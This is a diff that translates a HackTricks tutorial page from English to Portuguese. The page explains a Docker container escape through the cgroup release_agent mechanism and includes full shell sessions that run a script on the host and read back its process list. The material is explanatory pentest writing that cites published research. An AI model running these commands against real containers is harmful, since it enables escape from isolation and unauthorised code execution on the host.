@@ -4,26 +4,25 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-### Breaking down the proof of concept
+### Quebrando o conceito
 
-To trigger this exploit we need a cgroup where we can create a `release_agent` file and trigger `release_agent` invocation by killing all processes in the cgroup. The easiest way to accomplish that is to mount a cgroup controller and create a child cgroup.
+Para acionar essa exploração, precisamos de um cgroup onde possamos criar um arquivo `release_agent` e acionar a invocação do `release_agent` matando todos os processos no cgroup. A maneira mais fácil de fazer isso é montar um controlador cgroup e criar um cgroup filho.
 
-To do that, we create a `/tmp/cgrp` directory, mount the [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup controller and create a child cgroup (named “x” for the purposes of this example). While every cgroup controller has not been tested, this technique should work with the majority of cgroup controllers.
+Para fazer isso, criamos um diretório `/tmp/cgrp`, montamos o controlador cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) e criamos um cgroup filho (nomeado "x" para fins de exemplo). Embora nem todos os controladores cgroup tenham sido testados, essa técnica deve funcionar com a maioria dos controladores cgroup.
 
-If you’re following along and get **`mount: /tmp/cgrp: special device cgroup does not exist`**, it’s because your setup doesn’t have the RDMA cgroup controller. **Change `rdma` to `memory` to fix it**. We’re using RDMA because the original PoC was only designed to work with it.
+Se você estiver seguindo e receber **`mount: /tmp/cgrp: dispositivo especial cgroup não existe`**, é porque sua configuração não possui o controlador cgroup RDMA. **Mude `rdma` para `memory` para corrigir**. Estamos usando RDMA porque o PoC original foi projetado apenas para funcionar com ele.
 
-Note that cgroup controllers are global resources that can be mounted multiple times with different permissions and the changes rendered in one mount will apply to another.
+Observe que os controladores cgroup são recursos globais que podem ser montados várias vezes com permissões diferentes e as alterações renderizadas em uma montagem serão aplicadas a outra.
 
-We can see the “x” child cgroup creation and its directory listing below.
-
+Podemos ver a criação do cgroup filho "x" e sua listagem de diretórios abaixo.
 ```shell-session
 root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 root@b11cf9eab4fd:/# ls /tmp/cgrp/
@@ -31,28 +30,22 @@ cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  re
 root@b11cf9eab4fd:/# ls /tmp/cgrp/x
 cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
 ```
+Em seguida, **habilitamos as notificações cgroup** na liberação do cgroup "x" escrevendo um 1 em seu arquivo `notify_on_release`. Também definimos o agente de liberação do cgroup RDMA para executar um script `/cmd` - que criaremos posteriormente no contêiner - escrevendo o caminho do script `/cmd` no host para o arquivo `release_agent`. Para fazer isso, vamos obter o caminho do contêiner no host a partir do arquivo `/etc/mtab`.
 
-Next, we **enable cgroup** notifications on release of the “x” cgroup by **writing a 1** to its `notify_on_release` file. We also set the RDMA cgroup release agent to execute a `/cmd` script — which we will later create in the container — by writing the `/cmd` script path on the host to the `release_agent` file. To do it, we’ll grab the container’s path on the host from the `/etc/mtab` file.
+Os arquivos que adicionamos ou modificamos no contêiner estão presentes no host e é possível modificá-los de ambos os mundos: o caminho no contêiner e o caminho no host.
 
-The files we add or modify in the container are present on the host, and it is possible to modify them from both worlds: the path in the container and their path on the host.
-
-Those operations can be seen below:
-
+Essas operações podem ser vistas abaixo:
 ```shell-session
 root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
 root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-
-Note the path to the `/cmd` script, which we are going to create on the host:
-
+Observe o caminho para o script `/cmd`, que vamos criar no host:
 ```shell-session
 root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
 /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
 ```
-
-Now, we create the `/cmd` script such that it will execute the `ps aux` command and save its output into `/output` on the container by specifying the full path of the output file on the host. At the end, we also print the `/cmd` script to see its contents:
-
+Agora, criamos o script `/cmd` de forma que ele execute o comando `ps aux` e salve sua saída em `/output` no container, especificando o caminho completo do arquivo de saída no host. No final, também imprimimos o conteúdo do script `/cmd` para ver seus detalhes:
 ```shell-session
 root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
 root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
@@ -61,9 +54,7 @@ root@b11cf9eab4fd:/# cat /cmd
 #!/bin/sh
 ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
 ```
-
-Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a `/bin/sh` process and writing its PID to the `cgroup.procs` file in “x” child cgroup directory, the script on the host will execute after `/bin/sh` exits. The output of `ps aux` performed on the host is then saved to the `/output` file inside the container:
-
+Finalmente, podemos executar o ataque gerando um processo que termina imediatamente dentro do cgroup filho "x". Ao criar um processo `/bin/sh` e escrever seu PID no arquivo `cgroup.procs` no diretório do cgroup filho "x", o script no host será executado após a saída do `/bin/sh`. A saída do comando `ps aux` executado no host é então salva no arquivo `/output` dentro do contêiner:
 ```shell-session
 root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 root@b11cf9eab4fd:/# head /output
@@ -78,8 +69,7 @@ root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
 root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
 root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
 ```
-
-### References
+### Referências
 
 * [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
 
@@ -87,10 +77,10 @@ root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
